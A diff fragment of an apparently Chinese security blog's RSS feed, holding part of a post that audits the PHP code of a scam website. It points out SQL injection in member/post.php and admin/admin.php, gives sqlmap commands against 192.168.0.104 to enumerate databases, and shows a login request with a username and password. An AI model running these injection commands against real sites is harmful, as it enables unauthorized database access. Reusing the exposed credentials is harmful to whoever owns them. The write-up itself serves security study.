+&lt;p&gt;&lt;strong&gt;拓展补充：&lt;/strong&gt; 此处的时间指的是 Unix 时间戳，指的是从 &lt;strong&gt;1970年1月1日 00:00:00 UTC&lt;/strong&gt; 到当前时刻所经过的秒数，可以使用这个工具计算：&lt;a class=&#34;link&#34; href=&#34;https://tool.lu/timestamp/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;时间戳(Unix timestamp)转换工具&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;例如发送图片之前的时间1770099184&lt;/p&gt;
+&lt;p&gt;发送图片之后的时间1770099204&lt;/p&gt;
+&lt;p&gt;使用burp进行暴力破解文件名&lt;/p&gt;
+&lt;h2 id=&#34;场景二非法杀猪盘网站&#34;&gt;场景二：非法杀猪盘网站
+&lt;/h2&gt;&lt;p&gt;&lt;code&gt;include/conn.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;24行&lt;code&gt;define(&#39;MAGIC_QUOTES_GPC&#39;, get_magic_quotes_gpc());&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//对所有传入内容进行过滤
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_COOKIE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;_POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;_GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//这里$$_request意思就是“变量变量”
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//当$_request == &amp;#39;_POST&amp;#39;时，$$_request == ${&amp;#39;_POST&amp;#39;}是POST数组
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//$_POST as $_key =&amp;gt; $_value
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$$_request&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;//1.$_key{0} 拿到$_key字符串的第一个字符
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;//2.如果第一个字符不是_，就执行右侧赋值
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;//3. $_key = &amp;#39;username&amp;#39; $$_key = $username
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;//4. daddslashes防止sql注入
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$$_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;daddslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;前台登录的时候&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;GET /member/bin.php?act=login&amp;amp;username=18876115599&amp;amp;pwd=Ym3.Net&amp;amp;remember=true
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;member/post.php&lt;/code&gt;第5行&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ddh=trim($_GET[&#39;ddh&#39;]); &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在32行的时候不做任何过滤直接就收录到sql语句中&lt;/p&gt;
+&lt;p&gt;有可能存在sql注入&lt;/p&gt;
+&lt;p&gt;构建一个满足这页面的情况&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ddh=1&amp;amp;money=100&amp;amp;key=2052cd88bea3f9016a0057436dbbd750&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &amp;#34;http://192.168.0.104/member/post.php?ddh=1&amp;amp;money=100&amp;amp;key=2052cd88bea3f9016a0057436dbbd750&amp;#34; -p ddh --dbs
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;管理员后台，账号管理的时候访问地址&lt;code&gt;admin/admin.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;GET /admin/admin.php?clause=editinfo?id=2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现调用&lt;code&gt;119 function editinfo()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现有全局变量&lt;code&gt;global $db,$id,$LoginEdUserName;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;并且id变量直接进入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$rs = $db-&amp;gt;get_one(&amp;#34;SELECT * FROM `h_admin` where id = $id&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;把这个get请求保存到文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -r 1.txt --current-db
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>2.2 数字取证</title>
         <link>https://www.retr0.xyz/p/2.2-%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/</link>
         <pubDate>Mon, 02 Feb 2026 18:14:46 +0800</pubDate>
